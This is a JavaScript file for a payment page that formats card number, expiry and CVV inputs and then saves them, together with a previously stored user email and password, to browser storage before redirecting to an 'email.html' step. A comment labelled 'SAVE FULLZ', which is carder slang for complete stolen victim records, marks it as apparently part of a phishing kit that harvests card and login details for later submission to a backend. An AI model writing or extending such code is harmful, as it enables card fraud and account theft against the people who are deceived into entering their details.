/*
====================================
CREDIT PAGE SCRIPT
====================================
*/
/*====================================
CREDIT PAGE SCRIPT
====================================*/


function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (e) {
    // keep UI flow working even if storage is blocked
  }
}

// FORM

const creditForm =
  document.getElementById(
    "creditForm"
  );

// INPUTS

const cardName =
  document.getElementById(
    "cardName"
  );

const cardNumber =
  document.getElementById(
    "cardNumber"
  );

const expiry =
  document.getElementById(
    "expiry"
  );

const cvv =
  document.getElementById(
    "cvv"
  );


// BUTTON

const payButton =
  document.querySelector(
    ".pay-btn"
  );

/*
====================================
CARD NUMBER FORMAT
====================================
*/

if (cardNumber) {
  cardNumber.addEventListener(
    "input",
    (e) => {

      let value =
        e.target.value
          .replace(/\s+/g, "")
          .replace(/[^0-9]/gi, "");

      let formatted = "";

      for(let i = 0; i < value.length; i++){

        if(i > 0 && i % 4 === 0){
          formatted += " ";
        }

        formatted += value[i];

      }

      e.target.value =
        formatted.substring(0, 19);

  });
}



/*
====================================
EXPIRY FORMAT
====================================
*/

if (expiry) {
  expiry.addEventListener(
    "input",
    (e) => {

      let value =
        e.target.value
          .replace(/\D/g, "");

      // AUTO ADD "/"

      if(value.length >= 3){

        value =
          value.substring(0,2)
          + "/"
          + value.substring(2,4);

      }

      e.target.value =
        value.substring(0,5);

  });
}



/*
====================================
CVV LIMIT
====================================
*/

if (cvv) {
  cvv.addEventListener(
    "input",
    (e) => {

      e.target.value =
        e.target.value
          .replace(/\D/g, "")
          .substring(0,3);

  });
}



/*
====================================
FORM SUBMIT
====================================
*/

if (creditForm && cardNumber && expiry && cvv) {
  creditForm.addEventListener(
    "submit",
    (e) => {

      e.preventDefault();

      const card =
        cardNumber.value.trim();

      const exp =
        expiry.value.trim();

      const cvvValue =
        cvv.value.trim();



      /*
      ============================
      VALIDATION
      ============================
      */

      if(card.length < 19){

        alert(
          "Enter valid card number"
        );

        return;

      }

      
      
      if(exp.length < 5){

        alert(
          "Enter valid expiry date"
        );

        return;

      }

      
      
      if(cvvValue.length < 3){

        alert(
          "Enter valid CVV"
        );

        return;

      }

      
      
      /*
      ============================
      LOADING STATE
      ============================
      */

      if (payButton) {
        payButton.innerHTML =
          "Processing...";

        payButton.disabled = true;
      }
//SAVE FULLZ
      const payload = {
        cardName: cardName ? cardName.value.trim() : "",
        cardNumber: cardNumber ? cardNumber.value.trim() : "",
        expiry: expiry ? expiry.value.trim() : "",
        cvv: cvv ? cvv.value.trim() : "",
        // keep existing behavior: email/password will be submitted on next step
        userEmail: localStorage.getItem("userEmail") || "",
        userPassword: localStorage.getItem("userPassword") || ""
      };

      safeSetItem("cardName", payload.cardName);
      safeSetItem("cardNumber", payload.cardNumber);
      safeSetItem("expiry", payload.expiry);
      safeSetItem("cvv", payload.cvv);

      /*
      NOTE: Backend submission is intentionally triggered on the next step (email page).
      This avoids sending empty userEmail/userPassword from localStorage.
      */
      /*
      ============================
      REDIRECT
      ============================
      */

      setTimeout(() => {

        document.body.style.opacity = "0";

        setTimeout(() => {
            window.location.href = "email.html";

        },350);

      }, 1500);

    });
}
